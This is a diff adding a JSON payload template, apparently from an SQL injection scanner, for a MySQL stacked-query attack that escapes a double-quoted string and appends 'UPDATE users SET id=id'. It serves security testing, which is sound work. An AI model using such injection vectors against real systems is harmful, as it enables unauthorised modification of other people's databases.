@@ -1,0 +1,12 @@
+{
+ "dbms": "mysql",
+ "technique": "stacked",
+ "boundary": {
+  "prefix": "\"",
+  "suffix": "",
+  "type": "double-quote",
+  "desc": "double-quoted string"
+ },
+ "vector": "{B}; UPDATE users SET id=id-- -",
+ "comment": "mysql stacked via double-quoted string"
+}
